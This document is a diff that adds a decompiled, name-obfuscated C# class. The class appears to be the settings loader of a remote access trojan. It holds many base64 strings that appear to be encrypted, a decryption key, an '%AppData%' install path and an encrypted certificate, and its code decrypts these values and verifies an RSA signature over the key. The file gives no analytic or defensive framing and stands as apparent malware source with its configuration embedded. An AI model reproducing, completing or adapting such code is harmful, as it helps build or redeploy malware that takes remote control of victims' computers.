@@ -1,0 +1,163 @@
+using System;
+using System.Security.Cryptography;
+using System.Security.Cryptography.X509Certificates;
+using System.Text;
+
+// Token: 0x02000003 RID: 3
+public static class GClass1
+{
+	// Token: 0x0600001B RID: 27 RVA: 0x00002E84 File Offset: 0x00001084
+	public static bool smethod_0()
+	{
+		bool flag;
+		try
+		{
+			GClass1.string_6 = GClass1.smethod_4(GClass1.smethod_2(), GClass1.smethod_3(GClass1.string_6));
+			GClass1.gclass12_0 = new GClass12(GClass1.string_6);
+			GClass1.string_0 = GClass1.gclass12_0.method_2(GClass1.string_0);
+			GClass1.string_1 = GClass1.gclass12_0.method_2(GClass1.string_1);
+			GClass1.string_2 = GClass1.gclass12_0.method_2(GClass1.string_2);
+			GClass1.string_3 = GClass1.gclass12_0.method_2(GClass1.string_3);
+			GClass1.string_7 = GClass1.gclass12_0.method_2(GClass1.string_7);
+			GClass1.string_11 = GClass1.gclass12_0.method_2(GClass1.string_11);
+			GClass1.string_10 = GClass1.gclass12_0.method_2(GClass1.string_10);
+			GClass1.string_12 = GClass1.gclass12_0.method_2(GClass1.string_12);
+			GClass1.string_15 = GClass1.gclass12_0.method_2(GClass1.string_15);
+			GClass1.string_13 = GClass5.smethod_0();
+			GClass1.string_9 = GClass1.gclass12_0.method_2(GClass1.string_9);
+			GClass1.x509Certificate2_0 = GClass1.smethod_5(GClass1.smethod_3(GClass1.gclass12_0.method_2(GClass1.string_8)));
+			flag = GClass1.smethod_1();
+		}
+		catch
+		{
+			flag = false;
+		}
+		return flag;
+	}
+
+	// Token: 0x0600001C RID: 28 RVA: 0x00002FD4 File Offset: 0x000011D4
+	private static bool smethod_1()
+	{
+		bool flag;
+		try
+		{
+			flag = GClass1.smethod_10((RSACryptoServiceProvider)GClass1.smethod_7(GClass1.smethod_6(GClass1.x509Certificate2_0)), GClass13.smethod_1(GClass1.smethod_8(GClass1.smethod_2(), GClass1.string_6)), GClass1.smethod_9("SHA256"), GClass1.smethod_3(GClass1.string_9));
+		}
+		catch (Exception)
+		{
+			flag = false;
+		}
+		return flag;
+	}
+
+	// Token: 0x0600001E RID: 30 RVA: 0x000020FE File Offset: 0x000002FE
+	static Encoding smethod_2()
+	{
+		return Encoding.UTF8;
+	}
+
+	// Token: 0x0600001F RID: 31 RVA: 0x00002105 File Offset: 0x00000305
+	static byte[] smethod_3(string string_17)
+	{
+		return Convert.FromBase64String(string_17);
+	}
+
+	// Token: 0x06000020 RID: 32 RVA: 0x0000210D File Offset: 0x0000030D
+	static string smethod_4(Encoding encoding_0, byte[] byte_0)
+	{
+		return encoding_0.GetString(byte_0);
+	}
+
+	// Token: 0x06000021 RID: 33 RVA: 0x00002116 File Offset: 0x00000316
+	static X509Certificate2 smethod_5(byte[] byte_0)
+	{
+		return new X509Certificate2(byte_0);
+	}
+
+	// Token: 0x06000022 RID: 34 RVA: 0x0000211E File Offset: 0x0000031E
+	static PublicKey smethod_6(X509Certificate2 x509Certificate2_1)
+	{
+		return x509Certificate2_1.PublicKey;
+	}
+
+	// Token: 0x06000023 RID: 35 RVA: 0x00002126 File Offset: 0x00000326
+	static AsymmetricAlgorithm smethod_7(PublicKey publicKey_0)
+	{
+		return publicKey_0.Key;
+	}
+
+	// Token: 0x06000024 RID: 36 RVA: 0x0000212E File Offset: 0x0000032E
+	static byte[] smethod_8(Encoding encoding_0, string string_17)
+	{
+		return encoding_0.GetBytes(string_17);
+	}
+
+	// Token: 0x06000025 RID: 37 RVA: 0x00002137 File Offset: 0x00000337
+	static string smethod_9(string string_17)
+	{
+		return CryptoConfig.MapNameToOID(string_17);
+	}
+
+	// Token: 0x06000026 RID: 38 RVA: 0x0000213F File Offset: 0x0000033F
+	static bool smethod_10(RSACryptoServiceProvider rsacryptoServiceProvider_0, byte[] byte_0, string string_17, byte[] byte_1)
+	{
+		return rsacryptoServiceProvider_0.VerifyHash(byte_0, string_17, byte_1);
+	}
+
+	// Token: 0x04000002 RID: 2
+	public static string string_0 = "sV9L5Mgbe1/UOvnPTnlf9poitVU0hxbvx+558VvLu1FWgm8A+/g9PAjZ1Wwy0VEUwyfAmtP/t/sevpc4iUtItQ==";
+
+	// Token: 0x04000003 RID: 3
+	public static string string_1 = "Wr6VG3Pu79spG1EHuYx8tr3fxTQsr59xnfetI/MGjiPomSMciKO7YbMIpTbYVG0zBCkYrO1CDeD5UY+3vLF8PhQx7RJu9P2j3NVJLYdVJpxNIy/wTk5el8iS7Z5GFVrI";
+
+	// Token: 0x04000004 RID: 4
+	public static string string_2 = "pJgGHhdH9GxnYXy1eghP0w5/m5xrDB/EcuVUe4dogQxOlmT3gqgiYSXuf+MRjxSfYq2qFlr4ZhnjVUGu35CQYQ==";
+
+	// Token: 0x04000005 RID: 5
+	public static string string_3 = "V/rPad6oTjOS6HArltdiyKFq1+YTwLF+6+ahp4SYD365pX4AkRh5SEH8ApIfhYDGH/nSM5b510karROLiCH7Qg==";
+
+	// Token: 0x04000006 RID: 6
+	public static string string_4 = "%AppData%";
+
+	// Token: 0x04000007 RID: 7
+	public static string string_5 = "";
+
+	// Token: 0x04000008 RID: 8
+	public static string string_6 = "eUhrV28ycVdDeFZMM1AyVVBEUWdKN3hySFV6Y2VjZ1M=";
+
+	// Token: 0x04000009 RID: 9
+	public static string string_7 = "k1KSq4I3Z3qMFVBLQXe6J7xdN8Wt+uNNLX5M57zjm7hO3JHFyxLWv7yTtjla8wVP7wm61dwW99jNpMHUqCeVQw==";
+
+	// Token: 0x0400000A RID: 10
+	public static string string_8 = "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";
+
+	// Token: 0x0400000B RID: 11
+	public static string string_9 = "HXH7E8LdepNj6voyNJ6svALbxgleWnzw/5bjzXC2zT5ZkIOAL/eQHGtpFzCzolrz5arF4SvyfYXICnmRFVHT9shEyU9Lu6hPKIEEkJ2tiPMhDE3rPRQneQyXfxcvHiTN0UiR45ZCqdL0UhwDRGtgI0d/FOGS226CHDXolGtgisPSGqyObL9H8aZ63VDzL+eh7Z+SRN+6HES6a8GeivHfJTjDlZVQ9i6jNCC/+bswNUydjAfBl4zSfzEWLXJ35glUiH34CkZNDI4g2YMarfJNA+vGuQiVTDWm12IWX9W+g9uY/CM8bc5ZvYb+ca+WalkqMAwWMxtSwNlxH5LvDiBGlDdq0RNpQO3Zw4VMTWsZKLQYRJPJKFvRiZzdSEYtOFSffVkiubIGoq7bpBTJ9vJub66GfPXwlbay6KuPeLqjCBwN8dmde44cg/XgxrlH3nDn8s1LRmq/ZKi7M9gpuM1y0RaxcqAXbNbz3MTbt//hWy358NlObjiYtDN/y1EP7OEuEYMhy/Yo2cXRtsxU4nreCee9Ma0Xhn3BzstFm7WaiPKebKdX0sCEoCm845+fZHGMo2AkTmTalkIb8UZujL/98EQgHOmxMGaCXKhAypM8tICGVAIzhLdaH1KPXwZhpytFvDxa5H7dzRf7TMB9m/c+n9uAmqRz4A+vA2NBMfvygI/P0N6tk1e9O1NYH4/ngy57uIvxLvok1ckKQXcWnMgsi9efCO955+MoxhQxL8GE85efLNTT2+u0qZJIOb19dV6idmIyKF8vSN9gNJI4YXFXdrHMqWpLODM2jhxlwGnB9WGuSyRM0MflYYvrujFlU6AgiBpkTkKT5brz+uqHngkOAuHTAa1grFvlTEFouGrTM6yP2Uq+4AMhrK+VbaykBq4HI61G02U8ORxS7KdXi/jIK6dPYu8U+bWCyJqSMJ5z1tfYHpSb+80T6tZNs5iIxfW15vas1RrMwComMCdhb2DD0g==";
+
+	// Token: 0x0400000C RID: 12
+	public static X509Certificate2 x509Certificate2_0;
+
+	// Token: 0x0400000D RID: 13
+	public static string string_10 = "ON3+F8WKyqo9XFqAV8FJhJCNo0D6wKUSqERidQQst2iOgX3oPcN/Rwv7tp5Il/TSh8Pgj9j2XpBThmVYxo9Zxg==";
+
+	// Token: 0x0400000E RID: 14
+	public static GClass12 gclass12_0;
+
+	// Token: 0x0400000F RID: 15
+	public static string string_11 = "aT67V3S/e1LceYw5a+vfaueP5a+9RR8m+fv4c0GTTsYAWWcRgSukf54st7w8j1fhSyA9wkHmmfVRYnBf1M0sUw==";
+
+	// Token: 0x04000010 RID: 16
+	public static string string_12 = "OBwLsVy8Tc5AljW8e/YLu0lS8A0S9NDHV++hs1svp6NU78IuJlKXtE/Vz3KzK3CwwXkTXWUqTjs7LM3lfSVLDg==";
+
+	// Token: 0x04000011 RID: 17
+	public static string string_13 = null;
+
+	// Token: 0x04000012 RID: 18
+	public static string string_14 = "45";
+
+	// Token: 0x04000013 RID: 19
+	public static string string_15 = "YT57Yj9fgXn5rnFms6z7OGNaYZHs4gOy4YmcnRGLCIIaIWG0gv9mW+5RrX5rL5p7SBj/RWepGl5ymyMsBVAYtw==";
+
+	// Token: 0x04000014 RID: 20
+	public static string string_16;
+}
